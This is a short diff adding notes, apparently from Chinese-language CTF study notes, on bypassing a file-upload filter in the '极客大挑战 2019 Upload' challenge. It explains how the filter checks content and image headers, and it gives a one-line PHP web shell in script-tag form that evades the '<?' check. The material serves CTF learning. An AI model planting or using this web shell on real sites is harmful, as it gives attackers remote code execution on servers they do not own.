@@ -590,3 +590,21 @@ if(!empty($_FILES['upload_file'])){
 
 
 * 另法：设置空索引，即分别设置`arr[0]`, `arr[2]`，count将为2，而`arr[1]`将为空
+
+
+
+## Examples
+
+### [极客大挑战 2019]Upload
+
+1. 检测文件中是否包含`<?`
+2. 检测文件头，判断图片
+3. 文件后缀没有约束（不能php）
+
+**新Shell格式**：
+
+```html
+<script language="php">eval($_POST['a'])</script>
+```
+
+上传文件位置`upload/`
